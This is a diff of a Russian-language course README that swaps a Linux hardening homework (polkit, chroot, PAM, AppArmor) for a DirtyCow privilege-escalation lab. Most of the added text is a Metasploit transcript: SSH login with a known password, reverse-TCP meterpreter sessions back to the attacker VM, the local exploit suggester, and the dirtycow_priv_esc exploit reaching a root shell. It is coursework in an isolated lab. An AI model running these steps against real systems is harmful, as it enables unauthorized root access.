@@ -1,41 +1,160 @@
 Домашние задания по курсу "Безопасность Linux"
 ===============================================
 
-ДЗ 2 - polkit, chtoot, pamd, apparmor
+ДЗ 3 - dirtycow exploit - centos, ubuntu, metasploit
 -----------------------------------------------
 
-Создаем [vagrantfile](https://github.com/drJabber/otus_is_2020_01/blob/master/hw02/Vagrantfile) под 2 витруальные машины. 
-1. на основе образа Centos/7 (nodevictim, ip 192.168.99.101)
-2. на основе образа ubuntu (nodebuntu, ip 192.168.99.102)
+1. Centos
+2. Ubuntu
+3. Metasploit
+в vagrantfile плейбуками ansible 
+- поднимаем уязвимую vm nodebuntu на ubuntu 16.04 с ядром 4.4.0-42 (nodebuntu/bootstrap.yml), ip 192.168.99.102
+- создаем на vm nodebuntu пользователя otus с обычными правами и паролем vic!!vak
 
-Конфиги для vm задаются в файле [boxes_config.yml](https://github.com/drJabber/otus_is_2020_01/blob/master/hw02/boxes_config.yml)
-К vm nodevictim поключается виртуальный диск sata_v.vdi с помощью плагина vagrant-newdisk (необходимо установить) как /dev/sdb
-На стадии provivion в файлы /etc/hosts прописываются ip:hostname обеих машин. Используется плагин vagrant-hosts
-На стадии provision в каждой плейбуком ansible на vm nodevictim производятся следующие действия:
-1. Создание раздела /dev/sdb1 и файловой системы на /dev/sdb 
-2. В папку /etc/polkit-1/rules.d копируется [правило политики policykit](https://github.com/drJabber/otus_is_2020_01/blob/master/hw02/ansible/nodevictim/polkit/10-mount-sdb1-for-user-otus.rules), которое позволяет пользователю otus монтировать раздел /dev/sdb1 
-3. Создается группа otus и пользователи otus, otus2, otus3 в этой группе с паролем vic!!vak, для пользователей копируются открытые ключи из [папки ansible/nodevictim/ssh](https://github.com/drJabber/otus_is_2020_01/tree/master/hw02/ansible/nodevictim/ssh)
-4. Создается ограниченное chroot-окружение [скриптом ansible/chroot/make_chroot.sh](https://github.com/drJabber/otus_is_2020_01/blob/master/hw02/ansible/nodevictim/chroot/make_chroot.sh), в sshd_config прописывается использование chroot-окружения для пользователя otus3
-5. Создается pam.d политика, которая запрещает пользователю otus2 вход через ssh. в pam.d в конфиге sshd создается запись, которая требует строго положительного ответа от модуля pam_time.so, в конфиге time.conf создается запись, которая запрещает пользователю otus2 любые действия 24/7
-6. Скопипастил профиль nginx для докера [тут](https://docs.docker.com/engine/security/apparmor/), он лежит в локальной папке [ansible/nodebuntu/apparmor] и установил его в /etc/apparmor.d/containers/docker-nginx. Включил его в apparmor. развернул образ докера с nginx с включенным профилем 
+- поднимаем vm nodeintruder на kali/rolling 2020.1 (nodeintruder/bootstrap.yml)
+- копируем эксплоит (nodeintruder/msf/dirtycow_priv_exc.rb) в папку metasploit 
 
-Проверка выполнения задания:
-1. polkit:
-- ssh -i ./ansible/nodevictim/ssh/otus3_key otus@192.168.99.101 //зашли пользователем otus на vm nodevictim
-- udisksctl mount -b /dev/sdb1    // /dev/sdb1 монтируется в папку /run/media/otus/<some uuid>
+- заходим на nodeintruder: vagrant ssh nodeintruder
+- запускаем консоль msf: msfconsole -q
+- создаем сессию ssh с vm nodebuntu (192.168.99.102):
+<code>
+    msf5 > use auxiliary/scanner/ssh/ssh_login
+    msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.99.102
+    rhosts => 192.168.99.102
+    msf5 auxiliary(scanner/ssh/ssh_login) > set username otus
+    username => otus
+    msf5 auxiliary(scanner/ssh/ssh_login) > set password vic!!vak
+    password => vic!!vak
+    msf5 auxiliary(scanner/ssh/ssh_login) > run
 
-2. chroot
-- ssh -i ./ansible/nodevictim/ssh/otus3_key otus3@192.168.99.101 //зашли пользователем otus на vm nodevictim - попадаем с chroot directori, видим только то, что в /var/chroot/otus
+    [+] 192.168.99.102:22 - Success: 'otus:vic!!vak' ''
+    [*] Command shell session 1 opened (192.168.99.103:38379 -> 192.168.99.102:22) at 2020-02-26 15:23:30 -0500
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+    msf5 auxiliary(scanner/ssh/ssh_login) > sessions
 
-3. pamd
-- ssh -i ./ansible/nodevictim/ssh/otus3_key otus2@192.168.99.101  //пытаемся зайти пользователем otus2 на vm nodevictim - получаем connection closed
+    Active sessions
+    ===============
 
-4. apparmor
-- vagrant ssh nodebuntu
-- docker exec -it apparmor-nginx bash
-- top // получаем permission denied
-- exit 
-- aa-complain /etc/apparmor.d/containers/docker-nginx
-- docker exec -it apparmor-nginx bash
-- top // top выполняется
+    Id  Name  Type           Information                            Connection
+    --  ----  ----           -----------                            ----------
+    1         shell unknown  SSH otus:vic!!vak (192.168.99.102:22)  192.168.99.103:38379 -> 192.168.99.102:22 (192.168.99.102)
+</code>
 
+- апгрейдим сессию в meterpreter
+<code>
+    msf5 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
+    [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+    [!] SESSION may not be compatible with this module.
+    [*] Upgrading session ID: 1
+    [*] Starting exploit/multi/handler
+    [*] Started reverse TCP handler on 192.168.99.103:4433 
+    [*] Sending stage (985320 bytes) to 192.168.99.102
+    [*] Meterpreter session 2 opened (192.168.99.103:4433 -> 192.168.99.102:41734) at 2020-02-26 15:28:41 -0500
+    [-] Failed to start exploit/multi/handler on 4433, it may be in use by another process.
+    msf5 auxiliary(scanner/ssh/ssh_login) > sessions -l
+
+    Active sessions
+    ===============
+
+    Id  Name  Type                   Information                                                Connection
+    --  ----  ----                   -----------                                                ----------
+    1         shell unknown          SSH otus:vic!!vak (192.168.99.102:22)                      192.168.99.103:38379 -> 192.168.99.102:22 (192.168.99.102)
+    2         meterpreter x86/linux  uid=1001, gid=1001, euid=1001, egid=1001 @ 192.168.99.102  192.168.99.103:4433 -> 192.168.99.102:41734 (192.168.99.102)
+</code>
+
+- убедимся, что сессия запущена из под пользователя otus
+<code>
+    msf5 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
+    [*] Starting interaction with 2...
+
+    meterpreter > shell
+    Process 10451 created.
+    Channel 71 created.
+    id
+    uid=1001(otus) gid=1001(otus) groups=1001(otus)
+    exit
+    meterpreter > 
+    Background session 2? [y/N]  
+</code>
+
+- смотрим, что нам может посоветовать metasploit suggester в данной ситуации
+<code>
+    msf5 auxiliary(scanner/ssh/ssh_login) > use post/multi/recon/local_exploit_suggester 
+    msf5 post(multi/recon/local_exploit_suggester) > set session 2
+    session => 2
+    msf5 post(multi/recon/local_exploit_suggester) > run
+
+    [*] 192.168.99.102 - Collecting local exploits for x86/linux...
+    [*] 192.168.99.102 - 35 exploit checks are being tried...
+    [+] 192.168.99.102 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
+    [+] 192.168.99.102 - exploit/linux/local/dirtycow: The target appears to be vulnerable.
+    [+] 192.168.99.102 - exploit/linux/local/dirtycow_priv_esc: The target appears to be vulnerable.
+    [+] 192.168.99.102 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
+    [+] 192.168.99.102 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.
+    [+] 192.168.99.102 - exploit/linux/local/pkexec: The service is running, but could not be validated.
+    [*] Post module execution completed
+</code>
+
+- наблюдаем, среди прочего эксплоит dirtycow_priv_esc
+- выбираем этот эксплоит, устанавливаем сессию, в которой запустим эксплоит, payload и параметры подключения
+<code>
+    msf5 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/dirtycow_priv_esc
+    msf5 exploit(linux/local/dirtycow_priv_esc) > set session 2
+    session => 2
+    msf5 exploit(linux/local/dirtycow_priv_esc) > set payload linux/x86/meterpreter/reverse_tcp
+    payload => linux/x86/meterpreter/reverse_tcp
+    msf5 exploit(linux/local/dirtycow_priv_esc) > set lhost 192.168.99.103
+    lhost => 192.168.99.103
+    msf5 exploit(linux/local/dirtycow_priv_esc) > set lport 4321
+    lport => 4321
+</code>
+
+- запускаем эксплоит
+<code>
+    [*] Started reverse TCP handler on 192.168.99.103:4321 
+    [*] Writing '/tmp/.KvJCwYJAgaw.c' (3077 bytes) ...
+    [-] Compiling failed:
+    /tmp/.KvJCwYJAgaw.c: In function 'procselfmemThread':
+    /tmp/.KvJCwYJAgaw.c:64:14: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [-Wint-conversion]
+        lseek(f, map, SEEK_SET);
+                ^
+    In file included from /tmp/.KvJCwYJAgaw.c:8:0:
+    /usr/include/unistd.h:337:16: note: expected '__off_t {aka long int}' but argument is of type 'void *'
+    extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
+                    ^
+    /tmp/.KvJCwYJAgaw.c: In function 'main':
+    /tmp/.KvJCwYJAgaw.c:94:3: warning: implicit declaration of function 'asprintf' [-Wimplicit-function-declaration]
+    asprintf(&backup, "cp %s /tmp/.mrSSZhTstx", suid_binary);
+    ^
+    /tmp/.KvJCwYJAgaw.c:98:3: warning: implicit declaration of function 'fstat' [-Wimplicit-function-declaration]
+    fstat(f,&st);
+    ^
+    [*] Launching exploit...
+    [*] Sending stage (985320 bytes) to 192.168.99.102
+    [*] Meterpreter session 3 opened (192.168.99.103:4321 -> 192.168.99.102:60974) at 2020-02-26 15:59:13 -0500
+
+    meterpreter > 
+    [*] Setting '/proc/sys/vm/dirty_writeback_centisecs' to '0'...
+
+    Background session 3? [y/N]  
+
+</code>
+
+- игнорируем ответ "compiling failed" - т.к. в выводе компилятора только предупреждения. 
+- убеждаемся в успехе - смотрим открытую сессию 3, запускаем uname -a, id и т.п
+<code>
+    msf5 exploit(linux/local/dirtycow_priv_esc) > sessions -i 3
+    [*] Starting interaction with 3...
+
+    meterpreter > shell
+    Process 3696 created.
+    Channel 1 created.
+    uname -r
+    4.4.0-42-generic
+    uname -a
+    Linux nodebuntu 4.4.0-42-generic #62-Ubuntu SMP Fri Oct 7 23:11:45 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+    id
+    uid=0(root) gid=0(root) groups=0(root),1001(otus)
+</code>
